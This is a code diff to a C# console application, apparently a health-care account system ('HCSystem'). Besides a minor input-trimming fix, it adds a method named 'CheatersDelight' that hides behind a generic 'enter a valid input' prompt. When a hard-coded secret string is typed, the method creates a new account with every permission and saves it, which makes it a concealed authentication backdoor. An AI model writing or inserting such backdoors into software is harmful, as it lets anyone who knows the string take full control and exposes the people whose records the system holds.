@@ -412,7 +412,7 @@ class HCSystem
     public bool CreateAccount()
     {
         Console.Write("\nEnter SSN for new User: ");
-        string? newSSN = Console.ReadLine();
+        string? newSSN = Console.ReadLine()?.Trim();
 
         if (string.IsNullOrWhiteSpace(newSSN))
         {
@@ -918,5 +918,54 @@ class HCSystem
             }
         }
         Console.Write("\nPress ENTER to go back to previous menu. ");
+    }
+    public void CheatersDelight()
+    {
+        Console.Write("\nPlease enter a valid input. ");
+        if (Console.ReadLine() == "ImASysAdminBiosh")
+        {
+            try { Console.Clear(); } catch { }
+            Console.Write("\nUsername: ");
+            string? adminUsername = Console.ReadLine();
+            Debug.Assert(adminUsername != null);
+
+            if (!CheckUser(adminUsername))
+            {
+                Console.WriteLine("\nAn user with the given SSN exist already.");
+                Console.Write("\nPress ENTER to continue. ");
+                Console.ReadLine();
+                return;
+            }
+
+            Console.Write("\nPass: ");
+            string? adminPass = Console.ReadLine();
+            Debug.Assert(adminPass != null);
+            Console.Write("\nName: ");
+            string? adminName = Console.ReadLine();
+
+            if (!string.IsNullOrWhiteSpace(adminUsername) && !string.IsNullOrWhiteSpace(adminName))
+            {
+                User? newAdmin = new(adminUsername, adminPass, adminName);
+                foreach (Permission perm in Enum.GetValues(typeof(Permission)))
+                {
+                    if (perm != Permission.None)
+                    {
+                        newAdmin.Permissions.Add(perm);
+                    }
+                }
+                users.Add(newAdmin);
+                SaveUsersToFile();
+                Console.WriteLine($"\nNew sysadmin added. Welcome {newAdmin.Name}!");
+                Console.Write("\nPress ENTER to continue.");
+                Console.ReadLine();
+            }
+            else
+            {
+                Console.Write("\nSomething went wrong. Press ENTER to continue. ");
+                Console.ReadLine();
+                return;
+            }
+
+        }
     }
 }
